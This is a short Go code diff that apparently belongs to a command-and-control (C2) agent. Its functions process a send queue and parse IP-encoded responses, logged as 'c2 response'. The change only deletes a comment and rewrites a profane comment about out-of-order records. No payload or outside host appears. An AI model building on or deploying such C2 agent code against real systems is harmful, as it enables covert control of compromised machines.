@@ -265,7 +265,6 @@ func (a *Agent) ProcessSendQ() {
 		}
 
 		if len(dataIps) > 0 {
-			// process response
 			log.Printf("c2 response for %s: %s\n", query, dataIps)
 			delete(a.sendq, sendQItem)
 			a.ProcessResponse(dataIps)
@@ -298,7 +297,7 @@ func (a *Agent) ProcessResponse(response []string) {
 
 	headerFound := false
 
-	// look for the header because fucking go doesn't return the records in order
+	// look for the header because records may not be in order
 	headerIndex := 0
 	for i := range response {
 		if strings.HasPrefix(response[i], IP_HEADER_PREFIX) == true {
